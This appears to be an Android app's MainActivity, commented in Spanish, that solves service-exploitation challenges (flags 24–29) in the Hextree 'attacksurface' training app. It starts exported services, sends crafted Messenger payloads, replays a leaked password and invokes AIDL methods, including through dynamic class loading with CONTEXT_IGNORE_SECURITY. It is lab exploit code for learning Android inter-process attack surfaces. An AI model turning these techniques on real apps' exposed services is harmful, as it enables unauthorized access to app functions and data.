package com.ookami.evilservice;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import io.hextree.attacksurface.services.IFlag28Interface;
import io.hextree.attacksurface.services.IFlag29Interface;

public class MainActivity extends AppCompatActivity {

    /*
     * FLAG 27
     */

    // Mensajero para el servicio de Flag27 mediante el cual ENVIAMOS payloads
    private Messenger flag27Messenger;

    // Mensajero para RECIBIR mensajes
    private final Messenger messageReceiver = new Messenger(new IncomingHandlerFlag27());

    // Clase del handler de mensajes recibidos para el Servicio de Flag27
    private class IncomingHandlerFlag27 extends Handler {
        IncomingHandlerFlag27() {
            super(Looper.getMainLooper());
        }

        /*
         * Lógica principal de la respuesta que le brindamos al servicio para obtener la flag
         *
         * Imprime en los ogs la reply recibida
         * Imprime la contraseña recibida
         * Genera un nuevo mensaje con la misma contraseña para obtener la flag
         */
        @Override
        public void handleMessage(@NonNull Message msg) {

            String reply = msg.getData().getString("reply");

            if(reply != null)
                Log.i("Service Message Receiver","Reply: "+reply);

            String receivedPassword = msg.getData().getString("password");

            if (receivedPassword == null || flag27Messenger == null)
                return;

            Log.i("Message Receiver","Received password: "+receivedPassword);

            Message response = Message.obtain(null,3);

            Bundle payload = new Bundle();
            payload.putString("password",receivedPassword);

            response.replyTo = messageReceiver;

            response.setData(payload);

            try {
                flag27Messenger.send(response);
            } catch (RemoteException e) {
                throw new RuntimeException(e);
            }
        }
    }

    /*
     * FLAG 29
     */

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        Button btnStartService = findViewById(R.id.start_service);
        Button btnServiceLifecycle = findViewById(R.id.service_lifecycle);
        Button btnBasicMessage = findViewById(R.id.basic_message_handler);
        Button btnMessageReplies = findViewById(R.id.message_replies);
        Button btnAidlService = findViewById(R.id.aidl_service);
        Button btnComplexAidl = findViewById(R.id.complex_aidl_service);
        Button btnDynamicLoadAidl = findViewById(R.id.dynamic_load_aidl);
        Button btnDynamicLoadAidl2 = findViewById(R.id.dynamic_load_aidl2);

        btnStartService.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent intent = new Intent();
                        intent.setComponent(new ComponentName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag24Service"));
                        intent.setAction("io.hextree.services.START_FLAG24_SERVICE");
                        startService(intent);
                    }
                }
        );

        btnServiceLifecycle.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        Intent intent1 = new Intent();
                        intent1.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag25Service");
                        intent1.setAction("io.hextree.services.UNLOCK1");

                        Intent intent2 = new Intent();
                        intent2.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag25Service");
                        intent2.setAction("io.hextree.services.UNLOCK2");

                        Intent intent3 = new Intent();
                        intent3.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag25Service");
                        intent3.setAction("io.hextree.services.UNLOCK3");

                        startService(intent1);
                        startService(intent2);
                        startService(intent3);
                    }
                }
        );

        btnBasicMessage.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        // Conexión de servidor como CLIENTE con un Servicio tipo Message Handler
                        final ServiceConnection connFlag26 = new ServiceConnection() {
                            @Override
                            public void onServiceConnected(ComponentName name, IBinder service) {
                                // Delegamos el procesamiento del Binder a la clase Messenger
                                Messenger serviceMessenger = new Messenger(service);

                                // Creamos un nuevo mensaje para enviar con what 42 para el ejercicio
                                Message msg = Message.obtain(null,42);

                                // Enviamos el mensaje
                                try {
                                    serviceMessenger.send(msg);
                                }
                                catch (RemoteException e){
                                    throw new RuntimeException(e);
                                }
                            }

                            @Override
                            public void onServiceDisconnected(ComponentName name) {

                            }
                        };

                        Intent intent = new Intent();
                        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag26Service");
                        bindService(intent,connFlag26, Context.BIND_AUTO_CREATE);
                    }
                }
        );

        btnMessageReplies.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        // Conexión de Servidor que realiza la configuración de echo para poder recibir la flag
                        ServiceConnection connFlag27 = new ServiceConnection() {
                            @Override
                            public void onServiceConnected(ComponentName name, IBinder service) {
                                // Instanciamos el mensajero
                                flag27Messenger = new Messenger(service);
                                // Definimos un tipo de mensaje 1 para configurar el atributo echo del servicio
                                Message msg = Message.obtain(null,1);

                                Bundle payload = new Bundle();
                                // Definimos echo con el valor esperado
                                payload.putString("echo","give flag");
                                msg.setData(payload);

                                // Definimos un segundo mensaje de tipo 2 para obtener la contraseña del servicio
                                Message trigger = Message.obtain(null,2);
                                // Nos aseguramos que obj no sea null como pide el ejercicio
                                trigger.obj = new Intent();
                                // Definimos nuestro handler de respuestas en este segundo mensaje
                                trigger.replyTo = messageReceiver;

                                try {
                                    // Enviamos ambos mensajes
                                    flag27Messenger.send(msg);
                                    flag27Messenger.send(trigger);
                                }
                                catch (RemoteException e){
                                    throw new RuntimeException(e);
                                }
                            }

                            @Override
                            public void onServiceDisconnected(ComponentName name) {

                            }
                        };

                        // Bindeamos el servicio
                        Intent intent = new Intent();
                        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag27Service");
                        bindService(intent,connFlag27, Context.BIND_AUTO_CREATE);
                    }
                }
        );

        btnAidlService.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {

                        // Definimos la conexión con el servicio
                        ServiceConnection aidlConn = new ServiceConnection() {
                            @Override
                            public void onServiceConnected(ComponentName name, IBinder service) {
                                // En este caso nos "enlazamos" a la interfaz del servicio AIDL
                                // trás replicar el archivo de configuracion .aidl correspondiente
                                // Revisar aidl/io/hextree/attacksurface/services/IFlag28Interface.aidl
                                IFlag28Interface remoteService = IFlag28Interface.Stub.asInterface(service);
                                try {
                                    // Tras esto solo hace falta invocar el metodo declarado
                                    remoteService.openFlag();
                                } catch (RemoteException e) {
                                    throw new RuntimeException(e);
                                }
                            }

                            @Override
                            public void onServiceDisconnected(ComponentName name) {

                            }
                        };

                        // Bindeamos el servicio
                        Intent intent = new Intent();
                        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag28Service");
                        bindService(intent,aidlConn,Context.BIND_AUTO_CREATE);
                    }
                }
        );

        btnComplexAidl.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        // Declaramos el handler de conexión al servicio
                        ServiceConnection aidlConn = new ServiceConnection() {
                            @Override
                            public void onServiceConnected(ComponentName name, IBinder service) {
                                // Enlazamos la interfaz AIDL trás replicar el .aidl de forma igual
                                // al ejemplo anterior (cuida el orden de las funciones)
                                IFlag29Interface remoteService = IFlag29Interface.Stub.asInterface(service);
                                try {
                                    // Invocamos los métodos de manera adecuada
                                    String passwd = remoteService.init();
                                    Log.i("Flag29","Init password: "+passwd);

                                    remoteService.authenticate(passwd);

                                    remoteService.success();
                                } catch (RemoteException e) {
                                    throw new RuntimeException(e);
                                }
                            }

                            @Override
                            public void onServiceDisconnected(ComponentName name) {

                            }
                        };

                        // Bindeamos el servicio
                        Intent intent = new Intent();
                        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag29Service");
                        bindService(intent,aidlConn,Context.BIND_AUTO_CREATE);
                    }
                }
        );

        btnDynamicLoadAidl.setOnClickListener(
                new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        // Declaramos la conexión con el servicio
                        ServiceConnection aidlConn = new ServiceConnection() {
                            @Override
                            public void onServiceConnected(ComponentName name, IBinder service) {
                                try {
                                    // Declaramos el classLoader apuntando a la app indicada
                                    ClassLoader classLoader = MainActivity.this.createPackageContext(
                                            "io.hextree.attacksurface",
                                            Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY
                                    ).getClassLoader();

                                    // Cargamos durante ejecución la clase de la interfaz
                                    Class<?> iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag28Interface");

                                    // Recuperamos la subclase Stub iterando por las clases declaradas
                                    Class<?> stubClass = null;
                                    for (Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()){
                                        if (innerClass.getSimpleName().equals("Stub")){
                                            stubClass = innerClass;
                                            break;
                                        }
                                    }

                                    // Recuperamos el metodo asInterface de la clase
                                    assert stubClass != null;
                                    Method asInterfaceMethod = stubClass.getDeclaredMethod("asInterface", IBinder.class);

                                    // Lo invocamos con el argumento adecuado para enlazar el servicio
                                    Object iRemoteService = asInterfaceMethod.invoke(null,service);

                                    // Recuperamos el metodo del servicio (openFlag)
                                    assert  iRemoteService != null;
                                    Method openFlagMethod = iRemoteService.getClass().getDeclaredMethod("openFlag");

                                    // Ejecutamos dicho metodo
                                    openFlagMethod.invoke(iRemoteService);

                                } catch (PackageManager.NameNotFoundException |
                                         ClassNotFoundException | NoSuchMethodException |
                                         IllegalAccessException | InvocationTargetException e) {
                                    throw new RuntimeException(e);
                                }
                            }

                            @Override
                            public void onServiceDisconnected(ComponentName name) {

                            }
                        };

                        // Bindeamos al servicio
                        Intent intent = new Intent();
                        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag28Service");
                        bindService(intent,aidlConn,Context.BIND_AUTO_CREATE);
                    }
                }
        );

        btnDynamicLoadAidl2.setOnClickListener(
                new View.OnClickListener() {
                    // Segundo ejercicio AIDL adaptado a carga dinámica de clases

                    @Override
                    public void onClick(View v) {
                        ServiceConnection aidlConn = new ServiceConnection() {
                            @Override
                            public void onServiceConnected(ComponentName name, IBinder service) {
                                ClassLoader classLoader = null;
                                try {
                                    classLoader = MainActivity.this.createPackageContext(
                                            "io.hextree.attacksurface",
                                            Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY
                                    ).getClassLoader();

                                    Class<?> iRemoteServiceClass = classLoader.loadClass("io.hextree.attacksurface.services.IFlag29Interface");
                                    Class<?> stubClass = null;
                                    for (Class<?> innerClass : iRemoteServiceClass.getDeclaredClasses()){
                                        if (innerClass.getSimpleName().equals("Stub")){
                                            stubClass = innerClass;
                                        }
                                    }

                                    assert stubClass != null;
                                    Method asInterfaceMethod = stubClass.getDeclaredMethod("asInterface",IBinder.class);
                                    Object iRemoteService = asInterfaceMethod.invoke(null,service);

                                    assert iRemoteService != null;
                                    Method initMethod = iRemoteService.getClass().getDeclaredMethod("init");
                                    Method authenticateMethod = iRemoteService.getClass().getDeclaredMethod("authenticate",String.class);
                                    Method successMethod = iRemoteService.getClass().getDeclaredMethod("success");

                                    String password = (String) initMethod.invoke(iRemoteService);
                                    authenticateMethod.invoke(iRemoteService,password);
                                    successMethod.invoke(iRemoteService);



                                } catch (PackageManager.NameNotFoundException |
                                         ClassNotFoundException | NoSuchMethodException |
                                         IllegalAccessException | InvocationTargetException e) {
                                    throw new RuntimeException(e);
                                }
                            }

                            @Override
                            public void onServiceDisconnected(ComponentName name) {

                            }
                        };

                        Intent intent = new Intent();
                        intent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.services.Flag29Service");
                        bindService(intent,aidlConn,Context.BIND_AUTO_CREATE);
                    }
                }
        );
    }
}